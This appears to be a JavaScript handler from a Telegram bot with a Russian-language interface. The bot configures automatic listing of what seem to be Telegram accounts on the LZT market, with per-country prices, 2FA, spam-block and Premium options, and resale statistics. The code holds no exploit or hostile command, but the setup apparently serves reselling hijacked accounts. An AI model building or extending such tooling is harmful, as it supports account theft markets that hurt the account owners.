import { bot } from "../../index.js";
import Database from "../../../database/index.js";
import market from "../../../database/schemas/market.js";
import User from "../../../database/schemas/user.js";
import states from "../../states.js";

export default {
    name: "lzt",
    async exec(query, [action, reset]) {
        if (action) {
            switch (action) {
                case 'on':
                case 'off':
                    const u = await User.findOneAndUpdate({ id: query.from.id }, {
                        lztOn: action === 'on'
                    }, { new: true });

                    let inline_keyboard = query.message.reply_markup.inline_keyboard;

                    inline_keyboard[0][0] = {
                        text: u.lztOn ? '🟢 LZT' : '🛑 LZT',
                        callback_data: u.lztOn ? `lzt:off` : 'lzt:on'
                    };

                    return await bot.editMessageReplyMarkup({ inline_keyboard }, {
                        message_id: query.message.message_id,
                        chat_id: query.message.chat.id
                    });

                case 'settings':
                    const usr = await Database.getUser(query.from.id);
                    const x = await market.findOne({ token: usr.lzt });

                    if (!usr.lzt || reset || !x) {
                        await bot.editMessageCaption(query, `*⚙️ Отправьте токен LZT с правами маркета.*

❔ [Инструкция как настроить авто-залив LZT](https://teletype.in/@tonlog/auto-zaliv)
                            
❕ Для выхода с настроек нажмите на "🏠 Меню"
❗️ Внимание: при досрочном выходе введенные данные не сохраняться. Вам нужно заполнить информацию до конца.`, {
                            parse_mode: 'Markdown',
                            message_id: query.message.message_id,
                            chat_id: query.message.chat.id,
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        {
                                            text: '🔙 Назад',
                                            callback_data: 'menu'
                                        }
                                    ]
                                ]
                            }
                        }, 'cdn/settings.png')

                        return states.set(query.from.id, {
                            action: 'lzt',
                            args: []
                        });
                    }

                    return await bot.editMessageCaption(query, `*⚙️ Выберите какой параметр хотите изменить либо настройте заново.*`, {
                        parse_mode: 'Markdown',
                        message_id: query.message.message_id,
                        chat_id: query.message.chat.id,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: `🇷🇺 Россия | ${x.ru ? x.ru : 0} RUB`, callback_data: 'editlzt:ru' }
                                ],
                                [
                                    { text: `🇺🇦 Украина | ${x.ua ? x.ua : 0} RUB`, callback_data: 'editlzt:ua' }
                                ],
                                [
                                    { text: `🇰🇿 Казахстан | ${x.kz ? x.kz : 0} RUB`, callback_data: 'editlzt:kz' }
                                ],
                                [
                                    { text: `🇧🇾 Беларусь | ${x.br ? x.br : 0} RUB`, callback_data: 'editlzt:br' }
                                ],
                                [
                                    { text: `🇵🇱 Польша | ${x.pl ? x.pl : 0} RUB`, callback_data: 'editlzt:pl' }
                                ],
                                [
                                    { text: `🇰🇬 Кыргызстан | ${x.kg ? x.kg : 0} RUB`, callback_data: 'editlzt:kg' }
                                ],
                                [
                                    { text: `🇦🇿 Азербайджан | ${x.az ? x.az : 0} RUB`, callback_data: 'editlzt:az' }
                                ],
                                [
                                    { text: `🇮🇩 Индонезия | ${x.in ? x.in : 0} RUB`, callback_data: 'editlzt:in' }
                                ],
                                [
                                    { text: `🌍 Остальные страны | ${x.other ? x.other : 0} RUB`, callback_data: 'editlzt:price' }
                                ],
                                [
                                    { text: `🔐 2FA | ${x.pass ? x.pass : 0} RUB`, callback_data: 'editlzt:pass' }
                                ],
                                [
                                    { text: `⚠️ Спам-блок | ${x.spam ? x.spam : 0} RUB`, callback_data: 'editlzt:spam' }
                                ],
                                [
                                    { text: `⭐️ Premium | ${x.premium ? x.premium : 0} RUB`, callback_data: 'editlzt:premium' }
                                ],
                                [
                                    { text: '🔄 Заново', callback_data: 'lzt:settings:true' },
                                    { text: '🔙 Назад', callback_data: 'lzt' }
                                ]
                            ]
                        }
                    }, 'cdn/settings.png');
                    break;
            }
        }

        const user = await Database.getUser(query.from.id);
        const m = await market.findOne({ token: user.lzt });

            
        if (!user.lzt || !m) return await bot.editMessageCaption(query, `⚙️ Настройки

*Вы еще не настроили автоматическую продажу на LZT.*`, {
            parse_mode: 'Markdown',
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '⚙️ Настроить LZT',
                            // callback_data: 'menu'
                            callback_data: 'lzt:settings'
                        }
                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'start'
                        }
                    ]
                ]
            }
        }, 'cdn/settings.png');

        await bot.editMessageCaption(query, `*⚙️ Настройки*

*💰 Цена:* ${m.price}
🗒 Статистика:
  Успешно выложено: ${m.success}
  Ошибка публикации: ${m.error}
  Перепродажа: ${m.resale}`, {
            parse_mode: 'MarkdownV2',
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: user.lztOn ? '🟢 LZT' : '🛑 LZT',
                            callback_data: user.lztOn ? `lzt:off` : 'lzt:on'
                        },
                        {
                            text: `⚙️ Настройки`,
                            callback_data: 'lzt:settings'
                        }
                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'start'
                        }
                    ]
                ]
            }
        }, 'cdn/settings.png');
    }
}